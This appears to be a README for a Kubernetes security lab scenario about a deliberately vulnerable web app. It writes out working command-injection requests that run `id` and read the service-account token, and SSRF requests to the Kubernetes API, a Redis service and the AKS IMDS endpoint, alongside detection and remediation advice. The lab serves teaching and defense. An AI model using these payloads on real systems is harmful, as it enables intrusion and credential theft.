# Scenario 08 — Vulnerable Web App (SSRF + RCE)

| | |
|---|---|
| **Vulnerability class** | Application security / initial access |
| **Difficulty** | ⭐⭐⭐ Medium–hard |
| **Backends** | kind and AKS; IMDS requires AKS |
| **Namespace** | `webapp` |
| **MITRE ATT&CK for Containers** | [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/), [T1059 Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) |

## What it is

The app has command injection in `/ping?host=` and SSRF in `/fetch?url=`.
The Service is `ClusterIP` only; reach it using `kubectl port-forward`, not a
public endpoint.

## Why it matters

Application compromise is a common foothold. This lab demonstrates shell
execution, projected service-account token exposure, and cross-namespace
network reachability when scenario 06 is also deployed. The app's default
ServiceAccount has no special RBAC grant: stealing its token alone should not
grant API access.

## Deploy just this scenario

```powershell
kubectl apply -f scenarios/08-vulnerable-web-app-ssrf-rce/manifest.yaml
kubectl -n webapp port-forward svc/vuln-web 8080:80
```

## Exploit walkthrough

**1. Command injection from the workstation:**

```powershell
curl 'http://localhost:8080/ping?host=127.0.0.1;id'
```

The app executes the supplied shell command inside its container.

**2. Demonstrate that token theft does not equal privilege:**

```powershell
curl 'http://localhost:8080/ping?host=x;cat%20/var/run/secrets/kubernetes.io/serviceaccount/token'
```

Open a shell in the `webapp` pod and test its own token with the in-cluster CA;
a `403` is expected because this ServiceAccount has no API permissions:

```powershell
$pod = kubectl -n webapp get pod -l app=vuln-web -o jsonpath='{.items[0].metadata.name}'
kubectl -n webapp exec $pod -- sh
```

Inside the pod:

```sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
curl --cacert "$CA" -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods
```

**3. SSRF to the internal API:**

```powershell
curl 'http://localhost:8080/fetch?url=http://kubernetes.default.svc/version'
```

This endpoint is reachable from the pod network; it does not bypass Kubernetes
authorization.

**4. Cross-namespace reachability (deploy scenario 06 separately first):**

```powershell
curl 'http://localhost:8080/fetch?url=http://backend-redis.netpol-missing.svc:6379'
```

The response is not a Redis client, but a successful TCP connection / protocol
response demonstrates the flat-network path. Use the scenario 06 pod walkthrough
for interactive Redis commands.

**5. AKS IMDS (AKS only):**

The app supports the `metadata=true` query option only for the link-local IMDS
host so the required `Metadata: true` header is sent:

```powershell
curl 'http://localhost:8080/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01&metadata=true'
```

PowerShell single quotes preserve the `&` in the query string. For managed
identity token checks, use the constrained, read-only probe in
[`../09-aks-imds-managed-identity/README.md`](../09-aks-imds-managed-identity/README.md).

## What success looks like

`/ping` returns the output of the injected command. `/fetch` returns data from
an internal HTTP endpoint. The webapp ServiceAccount token is readable but has
no special API permissions by itself.

## Detection

- Falco runtime alerts may show a shell spawned by the Python process or
  outbound connections from the web pod. Rule names depend on Falco rule version.
- API audit events identify API requests authenticated as `system:serviceaccount:webapp:default`.
- Network telemetry can reveal webapp-to-API, webapp-to-IMDS, or
  cross-namespace connections.

## Remediation

- Never interpolate request data into a shell; use an argument array with
  `shell=False` and validate input.
- SSRF defenses should allow-list destinations, reject link-local and internal
  addresses, and revalidate redirects/DNS results.
- Set `automountServiceAccountToken: false` unless the app needs Kubernetes API
  access.
- Apply default-deny NetworkPolicies with explicit DNS and application flows.
- On AKS, prevent pod access to node IMDS and use least-privilege workload
  identity instead of a shared node identity.

**Before:** `subprocess.run("ping -c1 " + host, shell=True)`

**After:** `subprocess.run(["ping", "-c1", validated_host], shell=False)` plus
destination allow-listing for outbound HTTP.

## Suggested order

Attempt this after scenarios 01, 06, and 07. It ties application bugs to
identity and network boundaries without silently granting the app more RBAC
than its manifest specifies.
